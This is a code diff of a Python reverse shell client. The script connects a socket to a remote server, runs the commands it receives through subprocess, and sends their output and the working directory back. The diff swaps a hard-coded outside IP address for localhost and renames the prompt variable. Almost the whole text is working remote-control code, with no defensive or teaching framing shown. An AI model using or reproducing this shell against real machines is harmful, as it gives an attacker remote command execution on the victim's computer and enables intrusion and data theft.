@@ -3,7 +3,7 @@ import socket
 import subprocess
 
 s = socket.socket()
-server_address = ('34.220.167.231', 9999)
+server_address = ('127.0.0.1', 9999)
 
 s.connect(server_address)
 
@@ -17,8 +17,8 @@ while True:
                                stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_string = str(output_byte, "utf-8")
-        cwd = os.getcwd() + "$"
+        currentWD = os.getcwd() + "> "
 
-        s.send(str.encode(output_string + cwd))
+        s.send(str.encode(output_string + currentWD))
 
         print(output_string)
